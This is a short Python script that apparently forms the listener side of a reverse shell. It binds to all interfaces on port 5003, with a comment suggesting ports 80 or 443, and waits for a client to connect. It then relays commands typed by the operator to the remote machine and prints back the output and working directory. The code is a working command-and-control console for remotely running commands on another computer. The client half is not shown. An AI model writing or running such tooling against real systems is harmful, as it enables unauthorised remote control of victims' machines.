import socket

SERVER_HOST = "0.0.0.0" # listen on all IPv4 addresses
SERVER_PORT = 5003 # port to listen on (try HTTP:80 or HTTPS:443)
BUFFER_SIZE = 1024 * 128 # send 1024 (1kb) a time (as buffer size)
SEPARATOR = "<sep>" # separator string for sending 2 messages in one go

s = socket.socket()

# bind the socket to our local address
s.bind((SERVER_HOST, SERVER_PORT))

# make the PORT reusable
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# listen for connections
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    
    # get the command from prompt
    command = input(f"{cwd} $> ")

    if not command.strip():
        # if the command is empty, just continue in the loop
        continue
    # send the command to the client
    client_socket.send(command.encode())

    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    print("output:", output)

    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    print(results)

# close connection to the client
client_socket.close()

# close server connection
s.close()